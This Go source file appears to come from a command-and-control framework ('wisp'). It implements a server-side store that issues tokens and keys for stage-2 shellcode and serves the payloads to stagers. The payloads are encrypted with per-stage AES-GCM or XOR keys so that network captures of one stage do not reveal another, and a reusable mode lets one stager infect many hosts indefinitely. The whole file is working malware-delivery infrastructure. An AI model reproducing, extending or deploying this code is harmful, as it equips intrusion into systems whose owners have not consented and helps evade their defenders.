package server

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"sync"
	"time"

	"github.com/user/wisp/internal/db"
)

// stageEntry is a stage-2 payload issued to a specific stager.
type stageEntry struct {
	key     []byte // AES-256 (or XOR) key embedded in the stager (per-token rotation)
	payload []byte // stage-2 shellcode, stored server-side only
	expires time.Time
	xor     bool // true → XOR encryption (tiny C stager); false → AES-GCM (Go stager)
	oneTime bool // true → consume deletes; false → reusable across stagers/hosts
}

// StageStore holds pending stage-2 payloads. Each stage is encrypted with a
// random key that is baked into the stager, so network captures of one stage
// cannot decrypt another (CS-style per-stage key rotation). Stages are
// persisted to SQLite so they survive server restarts; a generated stager keeps
// working until its TTL elapses (or forever when ttl == 0).
type StageStore struct {
	mu     sync.Mutex
	stages map[string]stageEntry
	db     *db.Database
}

func newStageStore(database *db.Database) *StageStore {
	ss := &StageStore{stages: map[string]stageEntry{}, db: database}
	ss.restore()
	return ss
}

// restore reloads persisted stages on startup (stagers issued before a restart
// keep working). Expired entries are dropped.
func (ss *StageStore) restore() {
	if ss.db == nil {
		return
	}
	rows, err := ss.db.LoadStages()
	if err != nil {
		return
	}
	now := time.Now()
	for _, r := range rows {
		exp := time.Time{}
		if r.Expires.Valid {
			exp = r.Expires.Time
		}
		if r.Expires.Valid && now.After(exp) {
			_ = ss.db.DeleteStage(r.Token)
			continue
		}
		ss.stages[r.Token] = stageEntry{
			key:     r.Key,
			payload: r.Payload,
			expires: exp,
			xor:     r.XOR,
			oneTime: r.OneTime,
		}
	}
}

// Issue registers a stage-2 payload and returns the one-time token plus the
// AES key the stager must embed. Tokens and keys are never reused.
func (ss *StageStore) Issue(payload []byte, ttl time.Duration) (token, keyB64 string, err error) {
	return ss.issue(payload, ttl, false, true)
}

// IssueXOR is like Issue but marks the stage for XOR encryption, used by the
// tiny position-independent C stager (AES-GCM does not fit in ~2 KB).
func (ss *StageStore) IssueXOR(payload []byte, ttl time.Duration) (token, keyB64 string, err error) {
	return ss.issue(payload, ttl, true, true)
}

// IssuePersistent registers a reusable stage (one_time=false) so the same
// stager can be deployed to many hosts until the TTL elapses. ttl == 0 means
// the stage never expires on its own.
func (ss *StageStore) IssuePersistent(payload []byte, ttl time.Duration, xor bool) (token, keyB64 string, err error) {
	return ss.issue(payload, ttl, xor, false)
}

func (ss *StageStore) issue(payload []byte, ttl time.Duration, xor, oneTime bool) (token, keyB64 string, err error) {
	tb := make([]byte, 12)
	if _, err := rand.Read(tb); err != nil {
		return "", "", err
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", "", err
	}
	token = hex.EncodeToString(tb)

	var exp time.Time
	var expNull sql.NullTime
	if ttl > 0 {
		exp = time.Now().Add(ttl)
		expNull = sql.NullTime{Time: exp, Valid: true}
	}

	e := stageEntry{key: key, payload: payload, expires: exp, xor: xor, oneTime: oneTime}
	ss.mu.Lock()
	ss.stages[token] = e
	ss.mu.Unlock()

	if ss.db != nil {
		_ = ss.db.SaveStage(db.StageRow{
			Token:   token,
			Key:     key,
			Payload: payload,
			XOR:     xor,
			OneTime: oneTime,
			Expires: expNull,
		})
	}
	return token, base64.StdEncoding.EncodeToString(key), nil
}

// EncryptStage renders the stage for download: AES-GCM ciphertext in base64.
func (ss *StageStore) EncryptStage(payload, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, aead.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ct := aead.Seal(nonce, nonce, payload, nil)
	return base64.StdEncoding.EncodeToString(ct), nil
}

// EncryptStageXOR renders the stage as raw bytes XOR-encrypted with key.
func (ss *StageStore) EncryptStageXOR(payload, key []byte) []byte {
	out := make([]byte, len(payload))
	for i, b := range payload {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// consume is the shared consume path. For one-time stages the entry is deleted
// (memory + DB); reusable stages stay until they expire.
func (ss *StageStore) consume(token string) (stageEntry, bool) {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	e, exists := ss.stages[token]
	if !exists {
		return stageEntry{}, false
	}
	if !e.expires.IsZero() && time.Now().After(e.expires) {
		delete(ss.stages, token)
		if ss.db != nil {
			_ = ss.db.DeleteStage(token)
		}
		return stageEntry{}, false
	}
	if e.oneTime {
		delete(ss.stages, token)
		if ss.db != nil {
			_ = ss.db.DeleteStage(token)
		}
	}
	return e, true
}

// Consume fetches a stage by token. Returns the key and the encrypted blob
// (base64). One-time tokens are consumed on first fetch.
func (ss *StageStore) Consume(token string) (keyB64, encB64 string, ok bool) {
	e, exists := ss.consume(token)
	if !exists {
		return "", "", false
	}
	if e.xor {
		return base64.StdEncoding.EncodeToString(e.key), base64.StdEncoding.EncodeToString(ss.EncryptStageXOR(e.payload, e.key)), true
	}
	enc, err := ss.EncryptStage(e.payload, e.key)
	if err != nil {
		return "", "", false
	}
	return base64.StdEncoding.EncodeToString(e.key), enc, true
}

// ConsumeRaw fetches a stage by token and returns the key plus raw encrypted
// bytes (no base64/JSON wrapper), used by the tiny C stager that speaks plain
// HTTP.
func (ss *StageStore) ConsumeRaw(token string) (key []byte, data []byte, ok bool) {
	e, exists := ss.consume(token)
	if !exists {
		return nil, nil, false
	}
	if e.xor {
		return e.key, ss.EncryptStageXOR(e.payload, e.key), true
	}
	enc, err := ss.EncryptStage(e.payload, e.key)
	if err != nil {
		return nil, nil, false
	}
	raw, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, nil, false
	}
	return e.key, raw, true
}

// RevokeAll drops every pending stage (listener shutdown / operator action).
func (ss *StageStore) RevokeAll() {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	ss.stages = map[string]stageEntry{}
	if ss.db != nil {
		_, _ = ss.db.DB().Exec(`DELETE FROM stages`)
	}
}
